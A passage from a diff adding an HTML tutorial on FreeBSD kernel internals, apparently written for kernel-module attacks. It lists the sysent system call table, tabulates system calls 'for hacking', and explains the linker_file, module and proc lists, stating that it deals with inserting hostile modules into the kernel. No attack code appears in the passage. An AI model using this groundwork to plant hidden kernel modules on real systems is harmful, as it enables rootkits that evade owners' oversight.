+	{ 3, (sy_call_t *)readv },			/* 120 = readv */
+	{ 3, (sy_call_t *)writev },			/* 121 = writev */
+	{ 2, (sy_call_t *)settimeofday },		/* 122 = settimeofday */
+	{ 3, (sy_call_t *)fchown },			/* 123 = fchown */
+	{ 2, (sy_call_t *)fchmod },			/* 124 = fchmod */
+	{ compat(6,recvfrom) },		/* 125 = old recvfrom */
+	{ 2, (sy_call_t *)setreuid },			/* 126 = setreuid */
+	{ 2, (sy_call_t *)setregid },			/* 127 = setregid */
+	{ 2, (sy_call_t *)rename },			/* 128 = rename */
+	{ compat(2,truncate) },		/* 129 = old truncate */
+	{ compat(2,ftruncate) },		/* 130 = old ftruncate */
+	{ 2, (sy_call_t *)flock },			/* 131 = flock */
+	{ 2, (sy_call_t *)mkfifo },			/* 132 = mkfifo */
+	{ 6, (sy_call_t *)sendto },			/* 133 = sendto */
+	{ 2, (sy_call_t *)shutdown },			/* 134 = shutdown */
+	{ 4, (sy_call_t *)socketpair },			/* 135 = socketpair */
+	{ 2, (sy_call_t *)mkdir },			/* 136 = mkdir */
+	{ 1, (sy_call_t *)rmdir },			/* 137 = rmdir */
+	{ 2, (sy_call_t *)utimes },			/* 138 = utimes */
+	{ 0, (sy_call_t *)nosys },			/* 139 = obsolete 4.2 sigreturn */
+	{ 2, (sy_call_t *)adjtime },			/* 140 = adjtime */
+	{ compat(3,getpeername) },		/* 141 = old getpeername */
+	{ compat(0,gethostid) },		/* 142 = old gethostid */
+	{ compat(1,sethostid) },		/* 143 = old sethostid */
+	{ compat(2,getrlimit) },		/* 144 = old getrlimit */
+	{ compat(2,setrlimit) },		/* 145 = old setrlimit */
+	{ compat(2,killpg) },		/* 146 = old killpg */
+	{ 0, (sy_call_t *)setsid },			/* 147 = setsid */
+	{ 4, (sy_call_t *)quotactl },			/* 148 = quotactl */
+	{ compat(0,quota) },		/* 149 = old quota */
+	{ compat(3,getsockname) },		/* 150 = old getsockname */
+	{ 0, (sy_call_t *)nosys },			/* 151 = sem_lock */
+	{ 0, (sy_call_t *)nosys },			/* 152 = sem_wakeup */
+	{ 0, (sy_call_t *)nosys },			/* 153 = asyncdaemon */
+	{ 0, (sy_call_t *)nosys },			/* 154 = nosys */
+	{ 2, (sy_call_t *)nosys },			/* 155 = nfssvc */
+	{ compat(4,getdirentries) },		/* 156 = old getdirentries */
+	{ 2, (sy_call_t *)statfs },			/* 157 = statfs */
+	{ 2, (sy_call_t *)fstatfs },			/* 158 = fstatfs */
+	{ 0, (sy_call_t *)nosys },			/* 159 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 160 = nosys */
+	{ 2, (sy_call_t *)nosys },			/* 161 = getfh */
+	{ 2, (sy_call_t *)getdomainname },		/* 162 = getdomainname */
+	{ 2, (sy_call_t *)setdomainname },		/* 163 = setdomainname */
+	{ 1, (sy_call_t *)uname },			/* 164 = uname */
+	{ 2, (sy_call_t *)sysarch },			/* 165 = sysarch */
+	{ 3, (sy_call_t *)rtprio },			/* 166 = rtprio */
+	{ 0, (sy_call_t *)nosys },			/* 167 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 168 = nosys */
+	{ 5, (sy_call_t *)semsys },			/* 169 = semsys */
+	{ 6, (sy_call_t *)msgsys },			/* 170 = msgsys */
+	{ 4, (sy_call_t *)shmsys },			/* 171 = shmsys */
+	{ 0, (sy_call_t *)nosys },			/* 172 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 173 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 174 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 175 = nosys */
+	{ 1, (sy_call_t *)ntp_adjtime },		/* 176 = ntp_adjtime */
+	{ 0, (sy_call_t *)nosys },			/* 177 = sfork */
+	{ 0, (sy_call_t *)nosys },			/* 178 = getdescriptor */
+	{ 0, (sy_call_t *)nosys },			/* 179 = setdescriptor */
+	{ 0, (sy_call_t *)nosys },			/* 180 = nosys */
+	{ 1, (sy_call_t *)setgid },			/* 181 = setgid */
+	{ 1, (sy_call_t *)setegid },			/* 182 = setegid */
+	{ 1, (sy_call_t *)seteuid },			/* 183 = seteuid */
+	{ 0, (sy_call_t *)nosys },			/* 184 = lfs_bmapv */
+	{ 0, (sy_call_t *)nosys },			/* 185 = lfs_markv */
+	{ 0, (sy_call_t *)nosys },			/* 186 = lfs_segclean */
+	{ 0, (sy_call_t *)nosys },			/* 187 = lfs_segwait */
+	{ 2, (sy_call_t *)stat },			/* 188 = stat */
+	{ 2, (sy_call_t *)fstat },			/* 189 = fstat */
+	{ 2, (sy_call_t *)lstat },			/* 190 = lstat */
+	{ 2, (sy_call_t *)pathconf },			/* 191 = pathconf */
+	{ 2, (sy_call_t *)fpathconf },			/* 192 = fpathconf */
+	{ 0, (sy_call_t *)nosys },			/* 193 = nosys */
+	{ 2, (sy_call_t *)getrlimit },			/* 194 = getrlimit */
+	{ 2, (sy_call_t *)setrlimit },			/* 195 = setrlimit */
+	{ 4, (sy_call_t *)getdirentries },		/* 196 = getdirentries */
+	{ 8, (sy_call_t *)mmap },			/* 197 = mmap */
+	{ 0, (sy_call_t *)nosys },			/* 198 = __syscall */
+	{ 5, (sy_call_t *)lseek },			/* 199 = lseek */
+	{ 4, (sy_call_t *)truncate },			/* 200 = truncate */
+	{ 4, (sy_call_t *)ftruncate },			/* 201 = ftruncate */
+	{ 6, (sy_call_t *)__sysctl },			/* 202 = __sysctl */
+	{ 2, (sy_call_t *)mlock },			/* 203 = mlock */
+	{ 2, (sy_call_t *)munlock },			/* 204 = munlock */
+	{ 1, (sy_call_t *)undelete },			/* 205 = undelete */
+	{ 2, (sy_call_t *)futimes },			/* 206 = futimes */
+	{ 1, (sy_call_t *)getpgid },			/* 207 = getpgid */
+	{ 0, (sy_call_t *)nosys },			/* 208 = newreboot */
+	{ 3, (sy_call_t *)poll },			/* 209 = poll */
+	{ 0, (sy_call_t *)lkmnosys },			/* 210 = lkmnosys */
+	{ 0, (sy_call_t *)lkmnosys },			/* 211 = lkmnosys */
+	{ 0, (sy_call_t *)lkmnosys },			/* 212 = lkmnosys */
+	{ 0, (sy_call_t *)lkmnosys },			/* 213 = lkmnosys */
+	{ 0, (sy_call_t *)lkmnosys },			/* 214 = lkmnosys */
+	{ 0, (sy_call_t *)lkmnosys },			/* 215 = lkmnosys */
+	{ 0, (sy_call_t *)lkmnosys },			/* 216 = lkmnosys */
+	{ 0, (sy_call_t *)lkmnosys },			/* 217 = lkmnosys */
+	{ 0, (sy_call_t *)lkmnosys },			/* 218 = lkmnosys */
+	{ 0, (sy_call_t *)lkmnosys },			/* 219 = lkmnosys */
+	{ 4, (sy_call_t *)__semctl },			/* 220 = __semctl */
+	{ 3, (sy_call_t *)semget },			/* 221 = semget */
+	{ 3, (sy_call_t *)semop },			/* 222 = semop */
+	{ 1, (sy_call_t *)semconfig },			/* 223 = semconfig */
+	{ 3, (sy_call_t *)msgctl },			/* 224 = msgctl */
+	{ 2, (sy_call_t *)msgget },			/* 225 = msgget */
+	{ 4, (sy_call_t *)msgsnd },			/* 226 = msgsnd */
+	{ 5, (sy_call_t *)msgrcv },			/* 227 = msgrcv */
+	{ 3, (sy_call_t *)shmat },			/* 228 = shmat */
+	{ 3, (sy_call_t *)shmctl },			/* 229 = shmctl */
+	{ 1, (sy_call_t *)shmdt },			/* 230 = shmdt */
+	{ 3, (sy_call_t *)shmget },			/* 231 = shmget */
+	{ 2, (sy_call_t *)clock_gettime },		/* 232 = clock_gettime */
+	{ 2, (sy_call_t *)clock_settime },		/* 233 = clock_settime */
+	{ 2, (sy_call_t *)clock_getres },		/* 234 = clock_getres */
+	{ 0, (sy_call_t *)nosys },			/* 235 = timer_create */
+	{ 0, (sy_call_t *)nosys },			/* 236 = timer_delete */
+	{ 0, (sy_call_t *)nosys },			/* 237 = timer_settime */
+	{ 0, (sy_call_t *)nosys },			/* 238 = timer_gettime */
+	{ 0, (sy_call_t *)nosys },			/* 239 = timer_getoverrun */
+	{ 2, (sy_call_t *)nanosleep },			/* 240 = nanosleep */
+	{ 0, (sy_call_t *)nosys },			/* 241 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 242 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 243 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 244 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 245 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 246 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 247 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 248 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 249 = nosys */
+	{ 3, (sy_call_t *)minherit },			/* 250 = minherit */
+	{ 1, (sy_call_t *)rfork },			/* 251 = rfork */
+	{ 3, (sy_call_t *)openbsd_poll },		/* 252 = openbsd_poll */
+	{ 0, (sy_call_t *)issetugid },			/* 253 = issetugid */
+	{ 3, (sy_call_t *)lchown },			/* 254 = lchown */
+	{ 0, (sy_call_t *)nosys },			/* 255 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 256 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 257 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 258 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 259 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 260 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 261 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 262 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 263 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 264 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 265 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 266 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 267 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 268 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 269 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 270 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 271 = nosys */
+	{ 3, (sy_call_t *)getdents },			/* 272 = getdents */
+	{ 0, (sy_call_t *)nosys },			/* 273 = nosys */
+	{ 2, (sy_call_t *)lchmod },			/* 274 = lchmod */
+	{ 3, (sy_call_t *)lchown },			/* 275 = netbsd_lchown */
+	{ 2, (sy_call_t *)lutimes },			/* 276 = lutimes */
+	{ 3, (sy_call_t *)msync },			/* 277 = netbsd_msync */
+	{ 2, (sy_call_t *)nstat },			/* 278 = nstat */
+	{ 2, (sy_call_t *)nfstat },			/* 279 = nfstat */
+	{ 2, (sy_call_t *)nlstat },			/* 280 = nlstat */
+	{ 0, (sy_call_t *)nosys },			/* 281 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 282 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 283 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 284 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 285 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 286 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 287 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 288 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 289 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 290 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 291 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 292 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 293 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 294 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 295 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 296 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 297 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 298 = nosys */
+	{ 0, (sy_call_t *)nosys },			/* 299 = nosys */
+	{ 1, (sy_call_t *)modnext },			/* 300 = modnext */
+	{ 2, (sy_call_t *)modstat },			/* 301 = modstat */
+	{ 1, (sy_call_t *)modfnext },			/* 302 = modfnext */
+	{ 1, (sy_call_t *)modfind },			/* 303 = modfind */
+	{ 1, (sy_call_t *)kldload },			/* 304 = kldload */
+	{ 1, (sy_call_t *)kldunload },			/* 305 = kldunload */
+	{ 1, (sy_call_t *)kldfind },			/* 306 = kldfind */
+	{ 1, (sy_call_t *)kldnext },			/* 307 = kldnext */
+	{ 2, (sy_call_t *)kldstat },			/* 308 = kldstat */
+	{ 1, (sy_call_t *)kldfirstmod },		/* 309 = kldfirstmod */
+	{ 1, (sy_call_t *)getsid },			/* 310 = getsid */
+	{ 0, (sy_call_t *)nosys },			/* 311 = setresuid */
+	{ 0, (sy_call_t *)nosys },			/* 312 = setresgid */
+	{ 0, (sy_call_t *)nosys },			/* 313 = obsolete signanosleep */
+	{ 1, (sy_call_t *)aio_return },			/* 314 = aio_return */
+	{ 3, (sy_call_t *)aio_suspend },		/* 315 = aio_suspend */
+	{ 2, (sy_call_t *)aio_cancel },			/* 316 = aio_cancel */
+	{ 1, (sy_call_t *)aio_error },			/* 317 = aio_error */
+	{ 1, (sy_call_t *)aio_read },			/* 318 = aio_read */
+	{ 1, (sy_call_t *)aio_write },			/* 319 = aio_write */
+	{ 4, (sy_call_t *)lio_listio },			/* 320 = lio_listio */
+	{ 0, (sy_call_t *)yield },			/* 321 = yield */
+	{ 1, (sy_call_t *)thr_sleep },			/* 322 = thr_sleep */
+	{ 1, (sy_call_t *)thr_wakeup },			/* 323 = thr_wakeup */
+	{ 1, (sy_call_t *)mlockall },			/* 324 = mlockall */
+	{ 0, (sy_call_t *)munlockall },			/* 325 = munlockall */
+	{ 2, (sy_call_t *)__getcwd },			/* 326 = __getcwd */
+	{ 2, (sy_call_t *)sched_setparam },		/* 327 = sched_setparam */
+	{ 2, (sy_call_t *)sched_getparam },		/* 328 = sched_getparam */
+	{ 3, (sy_call_t *)sched_setscheduler },		/* 329 = sched_setscheduler */
+	{ 1, (sy_call_t *)sched_getscheduler },		/* 330 = sched_getscheduler */
+	{ 0, (sy_call_t *)sched_yield },		/* 331 = sched_yield */
+	{ 1, (sy_call_t *)sched_get_priority_max },		/* 332 = sched_get_priority_max */
+	{ 1, (sy_call_t *)sched_get_priority_min },		/* 333 = sched_get_priority_min */
+	{ 2, (sy_call_t *)sched_rr_get_interval },		/* 334 = sched_rr_get_interval */
+	{ 2, (sy_call_t *)utrace },			/* 335 = utrace */
+	{ 8, (sy_call_t *)sendfile },			/* 336 = sendfile */
+	{ 3, (sy_call_t *)kldsym },			/* 337 = kldsym */
+};
+</xmp>
+As you can see sysent[] contains one sysent structure for every system call
+installed on the system. Recall that the first element in the sysent structure
+is the argument count and the second the function pointer. This means for the
+kldsysm system call :
+<xmp>
+argument cound        : 3
+system call function  : kldsysm
+</xmp>
+And this means that we can get the sysent entry of every system call we want by
+reading sysent[system call number]. The easiest way to get the index is to use
+the syscalls.h file.
+
+<p>
+<H3><A NAME="I.6.1."></A>6.1 Important system calls for hacking</h3>
+<p>
+Now I want to extract the most important system calls you have to understand in
+order to do a bit of kernel hacking. I give you the system call number, the
+function and their arguments structure. Maybe you need to hack other
+system calls, its just a matter of creativity.
+
+
+
+<TABLE border=5 width=100%>
+<tr>
+
+<th>system call</th>
+<th>number</th>
+<th>argument struct</th>
+
+
+<tr>
+<td>read(p, uap)</td>
+<td>3</td>
+<td>struct read_args {<br>
+int fd;<br>
+void *buf;<br>
+size_t nbyte; }<br></td>
+</tr>
+
+
+<tr>
+<td>write(p, uap)</td>
+<td>4</td>
+<td>struct write_args {<br>
+int fd;<br>
+const void *buf;<br>
+size_t nbyte; }<br></td>
+</tr>
+
+<tr>
+<td>open(p, uap)</td>
+<td>5</td>
+<td>struct open_args {<br>
+char *path;<br>
+int flags;<br>
+int mode; }<br></td>
+</tr>
+
+<tr>
+<td>link(p, uap)</td>
+<td>9</td>
+<td>struct link_args {<br>
+char *path;<br>
+char *link; }<br></td>
+</tr>
+
+<tr>
+<td>recvfrom(p, uap)</td>
+<td>29</td>
+<td>struct recvfrom_args {<br>
+int s;<br>
+caddr_t buf;<br>
+size_t len;<br>
+int flags;<br>
+caddr_t from;<br>
+int *fromlenaddr; }<br>
+</td>
+</tr>
+
+<tr>
+<td>accept(p, uap)</td>
+<td>30</td>
+<td>struct accept_args {<br>
+int s;<br>
+caddr_t name;<br>
+int *anamelen; }<br>
+</td>
+</tr>
+
+
+<tr>
+<td>kill(p, uap)</td>
+<td>37</td>
+<td>struct kill_args {<br>
+int pid;<br>
+int signum; }<br>
+</td>
+</tr>
+
+<tr>
+<td>ktrace(p, uap)</td>
+<td>45</td>
+<td>struct ktrace_args {<br>
+char *fname;<br>
+int ops;<br>
+int facs;<br>
+int pid; }<br>
+</td>
+</tr>
+
+<tr>
+<td>ioctl(p, uap)</td>
+<td>54</td>
+<td>struct ioctl_args {<br>
+int fd_;<br>
+u_long com;<br>
+caddr_t data; }<br>
+</td>
+</tr>
+
+
+
+<tr>
+<td>reboot(p, uap)</td>
+<td>55</td>
+<td>struct reboot_args {<br>
+int opt; }<br>
+</td>
+</tr>
+
+
+<tr>
+<td>execve(p, uap)</td>
+<td>59</td>
+<td>struct execve_args {<br>
+char *fname;<br>
+char **argv;<br>
+char **envv; }<br>
+</td>
+</tr>
+
+
+
+<tr>
+<td>sbrk(p, uap)</td>
+<td>69</td>
+<td>struct sbrk_args {<br>
+int incr; }<br>
+</td>
+</tr>
+
+
+
+
+<tr>
+<td>socket(p, uap)</td>
+<td>97</td>
+<td>struct socket_args {<br>
+int domain;<br>
+int type;<br>
+int protocol; }<br>
+</td>
+</tr>
+
+
+<tr>
+<td>connect(p, uap)</td>
+<td>98</td>
+<td>struct connect_args {<br>
+int s;<br>
+caddr_t name;<br>
+int namelen; }<br>
+</td>
+</tr>
+
+
+
+<tr>
+<td>bind(p, uap)</td>
+<td>104</td>
+<td>struct bind_args {<br>
+int s;<br>
+caddr_t name;<br>
+int namelen; }<br>
+</td>
+</tr>
+
+
+<tr>
+<td>listen(p, uap)</td>
+<td>106</td>
+<td>struct listen_args {<br>
+int s;<br>
+int backlog; }<br>
+</td>
+</tr>
+
+<tr>
+<td>readv(p, uap)</td>
+<td>120</td>
+<td>struct readv_args {<br>
+int fd;<br>
+struct iovec *iovp;<br>
+u_int iovcnt; }<br>
+</td>
+</tr>
+
+
+<tr>
+<td>writev(p, uap)</td>
+<td>121</td>
+<td>struct writev_args {<br>
+int fd;<br>
+struct iovec *iovp;<br>
+u_int iovcnt; }<br>
+</td>
+</tr>
+
+<tr>
+<td>rename(p, uap)</td>
+<td>128</td>
+<td>struct rename_args {<br>
+char *from;<br>
+char *to; }<br>
+</td>
+</tr>
+
+<tr>
+<td>sendto(p, uap)</td>
+<td>133</td>
+<td>struct sendto_args {<br>
+int s;<br>
+caddr_t buf;<br>
+size_t len;<br>
+int flags;<br>
+caddr_t to;<br>
+int tolen; }<br>
+</td>
+</tr>
+
+
+<tr>
+<td>mkdir(p, uap)</td>
+<td>136</td>
+<td>struct mkdir_args {<br>
+char *path;<br>
+int mode; }<br>
+</td>
+</tr>
+
+<tr>
+<td>rmdir(p, uap)</td>
+<td>137</td>
+<td>struct rmdir_args {<br>
+char *path; }<br>
+</td>
+</tr>
+
+
+<tr>
+<td>getdirentries(p, uap)</td>
+<td>196</td>
+<td>struct getdirentries_args {<br>
+int fd;<br>
+char *buf;<br>
+u_int count;<br>
+long *basep; }<br>
+</td>
+</tr>
+
+<tr>
+<td>modnext(p, uap)</td>
+<td>300</td>
+<td>struct modnext_args {<br>
+int modid; }<br>
+</td>
+</tr>
+
+
+<tr>
+<td>modstat(p, uap)</td>
+<td>301</td>
+<td>struct modstat_args {<br>
+int modid; <br>
+struct module_stat *stat; }<br>
+</td>
+</tr>
+
+
+
+<tr>
+<td>modfnext(p, uap)</td>
+<td>302</td>
+<td>struct modfnext_args {<br>
+int modid; }<br>
+</td>
+</tr>
+
+<tr>
+<td>modfind(p, uap)</td>
+<td>303</td>
+<td>struct modfind_args {<br>
+char *name; }<br>
+</td>
+</tr>
+
+
+<tr>
+<td>kldload(p, uap)</td>
+<td>304</td>
+<td>struct kldload_args {<br>
+const char *file; }<br>
+</td>
+</tr>
+
+
+<tr>
+<td>kldunload(p, uap)</td>
+<td>305</td>
+<td>struct kldunload_args {<br>
+int fileid; }<br>
+</td>
+</tr>
+
+<tr>
+<td>kldfind(p, uap)</td>
+<td>306</td>
+<td>struct kldfind_args {<br>
+const char *file; }<br>
+</td>
+</tr>
+
+
+<tr>
+<td>kldnext(p, uap)</td>
+<td>307</td>
+<td>struct kldnext_args {<br>
+int fileid; }<br>
+</td>
+</tr>
+
+
+
+<tr>
+<td>kldstat(p, uap)</td>
+<td>308</td>
+<td>struct kldstat_args {<br>
+int fileid;<br>
+struct kld_file_stat *stat; }<br>
+</td>
+</tr>
+
+
+
+<tr>
+<td>kldsym(p, uap)</td>
+<td>337</td>
+<td>struct kldsym_args {<br>
+int fileid;<br>
+int cmd;<br>
+void *data; }<br>
+</td>
+</tr>
+
+</tr>
+</table>
+
+
+
+As you can see every system call gets the proc structure (standing for the
+process calling the system call) and a special argument structure.
+
+<p>
+<H3><A NAME="I.7."></A>7. Important Kernel structures / lists</h3>
+<p>
+
+Beside system calls kernel structures and lists are one of the most important
+things we have to deal with. This section will explain the most basic kernel
+structures and lists we need to understand. It is impossible to give you a
+complete list of all interesting kernel lists, of course.<br>
+This text is dealing with inserting hostile modules into the kernel. Those
+modules are wrapped by link files. The kernel inserts any link file loaded in
+a global list of linker_file structures. So let's take a look at this
+structure :
+<xmp>
+struct linker_file {
+    int			refs;		/* reference count */
+    int			userrefs;	/* kldload(2) count */
+    TAILQ_ENTRY(linker_file) link;	/* list of all loaded files */
+    char*		filename;	/* file which was loaded */
+    int			id;		/* unique id */
+    caddr_t		address;	/* load address */
+    size_t		size;		/* size of file */
+    int			ndeps;		/* number of dependancies */
+    linker_file_t*	deps;		/* list of dependancies */
+    STAILQ_HEAD(, common_symbol) common; /* list of common symbols */
+    TAILQ_HEAD(, module) modules;	/* modules in this file */
+    void*		priv;		/* implementation data */
+    struct linker_file_ops* ops;
+};  
+</xmp>
+Take a look at it. The general layout should be clear : link is used for the
+list management, filename is the name of the link file, modules stands for
+the modules in that file. This is the structure, but where is the global list
+holding all these entries? Take a look at the following line that can be
+found in kern_linker.c :
+<xmp>
+static linker_file_list_t files;
+</xmp>
+Unexpirienced kernel coders will ask what linker_file_list_t stands for (we
+thought of something like linker_file). Ok so let's look what
+linker_file_list_t stands for :
+<xmp>
+typedef TAILQ_HEAD(, linker_file) linker_file_list_t;
+</xmp>
+TAILQ_HEAD is one of lots of macros defined in queue.h. This include file
+provides lots o very helpful macros helping the kernel to manage a lot of
+internal lists. Let's say that the line above does something like
+initialization of the linker_file list, which can now be accessed via
+linker_file_list_t ('TheSeeker' will show how to use those macros). 
+Ok now we know where the linker_file list is located this should be enough for 
+the moment.<br>
+Now what about modules. As I said before modules are described by a module
+structure (see above). Those structures are also organized in a global list.
+So where and how is this list defined, take a look at this line from
+kern_module.c :
+<xmp>
+typedef TAILQ_HEAD(, module) modulelist_t;
+</xmp>
+Again we see TAILQ_HEAD providing us with a list and again we now know that
+modulelist_t is the global list for every module loaded.<br>
+One of the most important none-module related list in the kernel is the
+allproc (zombproc) list. The allproc list holds every process on the system
+except the zombie processes those are hold by zombproc. First let's take a
+look at the general structure of a process entry. The proc structure holds
+every piece of information needed :
+<xmp>
+struct	proc {
+	TAILQ_ENTRY(proc) p_procq;	/* run/sleep queue. */
+	LIST_ENTRY(proc) p_list;	/* List of all processes. */
+
+	/* substructures: */
+	struct	pcred *p_cred;		/* Process owner's identity. */
+	struct	filedesc *p_fd;		/* Ptr to open files structure. */
+	struct	pstats *p_stats;	/* Accounting/statistics (PROC ONLY). */
+	struct	plimit *p_limit;	/* Process limits. */
+	struct	vm_object *p_upages_obj;/* Upages object */
+	struct	procsig *p_procsig;
+#define p_sigacts	p_procsig->ps_sigacts
+#define p_sigignore	p_procsig->ps_sigignore
+#define p_sigcatch	p_procsig->ps_sigcatch
+
+#define	p_ucred		p_cred->pc_ucred
+#define	p_rlimit	p_limit->pl_rlimit
+
+	int	p_flag;			/* P_* flags. */
+	char	p_stat;			/* S* process status. */
+	char	p_pad1[3];
+
+	pid_t	p_pid;			/* Process identifier. */
+	LIST_ENTRY(proc) p_hash;	/* Hash chain. */
+	LIST_ENTRY(proc) p_pglist;	/* List of processes in pgrp. */
+	struct	proc *p_pptr;	 	/* Pointer to parent process. */
+	LIST_ENTRY(proc) p_sibling;	/* List of sibling processes. */
+	LIST_HEAD(, proc) p_children;	/* Pointer to list of children. */
+
+	struct callout_handle p_ithandle; /*
+					      * Callout handle for scheduling
+					      * p_realtimer.
+					      */
+/* The following fields are all zeroed upon creation in fork. */
+#define	p_startzero	p_oppid
+
+	pid_t	p_oppid;	 /* Save parent pid during ptrace. XXX */
+	int	p_dupfd;	 /* Sideways return value from fdopen. XXX */
+
+	struct	vmspace *p_vmspace;	/* Address space. */
+
+	/* scheduling */
+	u_int	p_estcpu;	 /* Time averaged value of p_cpticks. */
+	int	p_cpticks;	 /* Ticks of cpu time. */
+	fixpt_t	p_pctcpu;	 /* %cpu for this process during p_swtime */
+	void	*p_wchan;	 /* Sleep address. */
+	const char *p_wmesg;	 /* Reason for sleep. */
+	u_int	p_swtime;	 /* Time swapped in or out. */
+	u_int	p_slptime;	 /* Time since last blocked. */
+
+	struct	itimerval p_realtimer;	/* Alarm timer. */
+	u_int64_t	p_runtime;	/* Real time in microsec. */
+	struct	timeval p_switchtime;	/* When last scheduled */
+	u_quad_t p_uticks;		/* Statclock hits in user mode. */
+	u_quad_t p_sticks;		/* Statclock hits in system mode. */
+	u_quad_t p_iticks;		/* Statclock hits processing intr. */
+
+	int	p_traceflag;		/* Kernel trace points. */
+	struct	vnode *p_tracep;	/* Trace to vnode. */
+
+	int	p_siglist;		/* Signals arrived but not delivered. */
+
+	struct	vnode *p_textvp;	/* Vnode of executable. */
+
+	char	p_lock;			/* Process lock (prevent swap) count. */
+	char	p_oncpu;		/* Which cpu we are on */
+	char	p_lastcpu;		/* Last cpu we were on */
+	char	p_pad2;			/* alignment */
+
+	short	p_locks;		/* DEBUG: lockmgr count of held locks */
+	short	p_simple_locks;		/* DEBUG: count of held simple locks */
+	unsigned int	p_stops;	/* procfs event bitmask */
+	unsigned int	p_stype;	/* procfs stop event type */
+	char	p_step;			/* procfs stop *once* flag */
+	unsigned char	p_pfsflags;	/* procfs flags */
+	char	p_pad3[2];		/* padding for alignment */
+	register_t p_retval[2];		/* syscall aux returns */
+	struct	sigiolst p_sigiolst;	/* list of sigio sources */
+	int	p_sigparent;		/* signal to parent on exit */
+	sigset_t p_oldsigmask;		/* saved mask from before sigpause */
+	int	p_sig;			/* for core dump/debugger XXX */
+        u_long	p_code;	  	        /* for core dump/debugger XXX */
+
+/* End area that is zeroed on creation. */
+#define	p_endzero	p_startcopy
+
+/* The following fields are all copied upon creation in fork. */
+#define	p_startcopy	p_sigmask
+
+	sigset_t p_sigmask;	/* Current signal mask. */
+	u_char	p_priority;	/* Process priority. */
+	u_char	p_usrpri;	/* User-priority based on p_cpu and p_nice. */
+	char	p_nice;		/* Process "nice" value. */
+	char	p_comm[MAXCOMLEN+1];
+
+	struct 	pgrp *p_pgrp;	/* Pointer to process group. */
+
+	struct 	sysentvec *p_sysent; /* System call dispatch information. */
+
+	struct	rtprio p_rtprio;	/* Realtime priority. */
+/* End area that is copied on creation. */
+#define	p_endcopy	p_addr
+	struct	user *p_addr;	/* Kernel virtual addr of u-area (PROC ONLY). */
+	struct	mdproc p_md;	/* Any machine-dependent fields. */
+
+	u_short	p_xstat;	/* Exit status for wait; also stop signal. */
+	u_short	p_acflag;	/* Accounting flags. */
+	struct	rusage *p_ru;	/* Exit information. XXX */
+
+	int	p_nthreads;	/* number of threads (only in leader) */
+	void	*p_aioinfo;	/* ASYNC I/O info */
+	int	p_wakeup;	/* thread id */
+	struct proc *p_peers;	
+	struct proc *p_leader;
+	struct	pasleep p_asleep;	/* Used by asleep()/await(). */
+};
+</xmp> 
+This structure is quite big and complex. There are lots of substructurs we will
+use in part II, so I won't explain them here. Most of the fields should be
+clear. The vmspace field is also very important for us, because it's our gate
+to the process' memory.<br>
+Now we know how processes are described, but where do we have the allproc and
+zombroc lists ? Let's search for them in kern_proc.c :
+<xmp>
+struct proclist allproc;
+struct proclist zombroc;
+</xmp>
+A reference to proclist can be found in proc.h
+<xmp>
+LIST_HEAD(proclist, proc);
+</xmp>
+LIST_HEAD is another macro taken from queue.h that provides a list (here
+proclist). Now we know how to find any process running on the system : just
+look through allproc (zombroc).<br>
+This are the most basic lists and structures we need to understand, there are
+thousands more, but we won't need them too often.
+
+<p>
+<H3><A NAME="I.7.1."></A>7.1.1. TheSeeker - or how to access kernel lists</h3>
+<p>
+
+I developed a little module that inserts one new system call which provides
+us with the ability to export some kernel space structures and lists to user
+space. This is not very useful (there are better libc calls), I just wrote it
+to show you in an easy way how to handle system calls, kernel lists, user space
+kernel space interfaces, etc. There are some pieces of code that handle the
+user space <-> kernel space transition. For those not aware of this problem I
+suggest first reading section I.8. Those who read my Linux article should be
+able to continue without problems. So here is the module source :
+<xmp>
+#include <sys/types.h>
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/module.h>
+#include <sys/sysent.h>
+#include <sys/kernel.h>
+#include <sys/systm.h>
+#include <sys/linker.h>
+#include <sys/sysproto.h>
+#include <sys/sysent.h>
+#include <sys/proc.h>
+#include <sys/syscall.h>
+#include <sys/file.h>
+#include <sys/malloc.h>
+#include <sys/types.h>
+#include <sys/lock.h>
+
+#define GD_ALLPROC       1
